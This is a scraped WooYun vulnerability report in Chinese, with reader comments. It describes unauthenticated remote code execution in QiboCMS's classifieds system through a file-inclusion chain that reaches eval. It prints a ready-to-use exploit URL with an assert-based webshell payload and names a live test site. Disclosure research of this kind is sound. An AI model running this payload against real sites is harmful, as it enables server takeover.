{"id": 65297, "wybug_id": "wooyun-2015-0122599", "wybug_title": "qibocms 分类系统最新版 前台无限制Getshell。", "wybug_corp": "齐博CMS", "wybug_author": "′雨。", "wybug_date": "2015-06-24 23:21", "wybug_open_date": "2015-09-27 16:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向公众公开  简要描述： 看到分数的那一刻,眼泪留下来。分数出来以前一直感觉静不下心来,分数出来后更是。。 唉 , 或许要复读。把之前一些没来得及发的洞先发了来。、无需登录,无视GPC。 详细说明：  下载地址:http://down.qibosoft.com/down.php?v=fenlei1.0首先来看一下inc/common.inc.php中\nisset($page) && $page = intval($page);isset($id) && $id = intval($id);isset($fup) && $aid = intval($fup);isset($aid) && $aid = intval($aid);isset($rid) && $rid = intval($rid);isset($fid) && $fid = intval($fid);isset($cid) && $cid = intval($cid);isset($cityid) && $cityid = intval($cityid);\n可以看到city_id在全局文件中被intval了。再看到search.php中\n$postdb[city_id]\t&&\t$city_id\t=\t$postdb[city_id];//对city_id 重新定义了一次。 导致了无视全局文件中的intval了。$postdb[street_id]\t&&\t$street_id\t=\t$postdb[street_id];$postdb[zone_id]\t&&\t$zone_id\t=\t$postdb[zone_id];@include_once(ROOT_PATH.\"data/zone/$city_id.php\");//包含$city_fid=select_where(\"{$_pre}city\",\"'postdb[city_id]'  onChange=\\\"choose_where('getzone',this.options[this.selectedIndex].value,'','1','')\\\"\",$city_id);\n全局有转义 截断不了 但是因为qibo的特殊性 在qibo的后台文件当中function_exists('html') OR exit('ERR');所以直接访问是不行的。是这样判断的 所以我们就算不能截断 我们可以直接把后台的文件包含进来 然后进而操作后台。所以qibo在操作包含的文件中都用正则来过滤了, 却遗漏了这里。本来想参考师傅大屌的 WooYun: 齐博地方门户鸡肋文件包含造成的高危SQL注入 但是打开do/js.php 发现\n<?phperror_reporting(0);require(dirname(__FILE__).\"/../data/config.php\");if(!eregi(\"^([0-9]+)$\",$_GET['id'])){\tdie(\"document.write('ID不存在');\");}\n已经把extract去掉了, 那就找另外的。在admin/hack.php中\nif($hack&&ereg(\"^([a-z_0-9]+)$\",$hack)){\tif(is_file(ROOT_PATH.\"hack/$hack/admin.php\")){\t\tinclude(ROOT_PATH.\"hack/$hack/admin.php\");\t}else{\t\tshowmsg(\"文件不存在\");\t}\t}\n再包含文件 再继续跟。在hack/jfadmin/admin.php中\nelseif($action==\"addjf\"&&$Apower[jfadmin_mod]){     \t$db->query(\"INSERT INTO `{$pre}jfabout` ( `fid` , `title` , `content`, `list` ) VALUES ( '$fid', '$title', '$content', '$list' )\");\tjump(\"添加成功\",\"index.php?lfj=jfadmin&job=listjf&fid=$fid\",1);}\n这里入库了。  再看到do/jf.php中\n$lfjdb && $lfjdb[money]=get_money($lfjdb[uid]);$query = $db->query(\"SELECT * FROM {$pre}jfsort ORDER BY list\");while($rs = $db->fetch_array($query)){\t$fnameDB[$rs[fid]]=$rs[name];\t$query2 = $db->query(\"SELECT * FROM {$pre}jfabout WHERE fid='$rs[fid]' ORDER BY list\");//这里默认查的都是1 所以入库的时候fid弄为1\twhile($rs2 = $db->fetch_array($query2)){ \t\teval(\"\\$rs2[title]=\\\"$rs2[title]\\\";\");//就eval了。\t\teval(\"\\$rs2[content]=\\\"$rs2[content]\\\";\");\t\t$jfDB[$rs[fid]][]=$rs2;\t}}\n准备写一句话的时候,却发现了在inc/common.inc.php中\nfunction Add_S($array){\tforeach($array as $key=>$value){\t\t@eregi(\"['\\\\\\\"]+\",$key) && die('ERROR KEY!');\t\tif(!is_array($value)){\t\t\t\t\t\t$value=str_replace(\"&#x\",\"& # x\",$value);\t//过滤一些不安全字符\t\t\t$value=preg_replace(\"/eval/i\",\"eva l\",$value);\t//过滤不安全函数\t\t\t!get_magic_quotes_gpc() && $value=addslashes($value);\t\t\t$array[$key]=$value;\t\t}else{\t\t\t$array[$key]=Add_S($array[$key]); \t\t}\t}\treturn $array;}\n把eval替换了,这样我们就用assert把。http://web/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[yu])}http://web/new/fenlei/do/jf.phpPOST：yu=phpinfo();随便找了个测试了下http://qbfenlei15.2fly.com.cn/do/jf.php   漏洞证明：  \n\n   修复方案：  继续用你们惯用的正则把这个限制一下。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-29 16:20 厂商回复： 感谢提出来 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-24 23:22 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @Finger 卧槽 我好感动。QAQ    \n     2015-06-24 23:24 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  雨牛不哭！    \n     2015-06-24 23:26 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  雨牛回归。。。！！！    \n     2015-06-24 23:31 |    \t\tPany自留地 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:29        | 0day just like a joke.)\t\t \n  雨牛不哭！    \n     2015-06-24 23:35 |    \t\tHax0rs \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:4        | Hax0rs)\t\t \n  你关注的白帽子 ′雨。 发表了漏洞 qibocms 分类系统最新版 前台无限制Getshell。    \n     2015-06-25 00:26 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | hacking for fun)\t\t \n  高考完的放纵…………    \n     2015-06-25 00:57 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  北大青鸟，清华紫光，你值得加入    \n     2015-06-25 01:00 |    \t\t昊昊 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:15        | ...)\t\t \n  节哀.能上二本就走吧，复读也是浪费时间    \n     2015-06-25 08:58 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  我都等了你一年了    \n     2015-06-25 09:13 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  学历对于你这样的大黑客没啥用    \n     2015-06-25 09:42 |    \t\tCheery \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 0.0)\t\t \n  眼泪 ‘留’下来！！！    \n     2015-06-25 10:05 |    \t\t我爱水秀天蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:15        | 好好学习，天天向上！)\t\t \n  个人建议：最好再复读一年，复读一年也不是浪费时间，想当年俞敏洪也考了三次才考上北大，你还很年轻，未来的路还很长。你很聪明，只是可能花在学校课程学习上的时间少些而已，复读一年争取上个好点的大学，发挥你的代码审计特长，再锻炼几年，在大学里结交一些牛人，将来在这个行业里一定有更大的前途。上没上大学还是有些区别的，虽然大学里可能学不到实际的有用的东西，但那是一种人生经历，会扩展你的视野和提升你的心态，对你将来的发展只有好处没坏处。    \n     2015-06-25 13:01 |    \t\tDeadSea \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:28        | 静心)\t\t \n  终于回来了。    \n     2015-06-27 10:28 |    \t\tyinian \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:22        | 代 码 审 计 求 交 流)\t\t \n  @我爱水秀天蓝 我天朝有多点你这样的人才那还怕收复不了美国？    \n     2015-06-27 13:12 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  你可以考虑特招，看看有没有专业对口的院校，把wooyun id报上去    \n     2015-07-04 21:46 |    \t\t爱神 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Qq190290957)\t\t \n  @nzk1912 开玩笑呢，哪个大学会看乌云id招生，招生办的只认钱。。    \n     2015-07-10 11:18 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  @爱神 如果招安全的人不知道乌云，那家公司也不值得去    \n     2015-07-14 10:30 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  @′雨。 雨牛不哭    \n     2015-08-22 21:26 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  https://security.alibaba.com/blog/blog.htm?id=21 牛逼啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}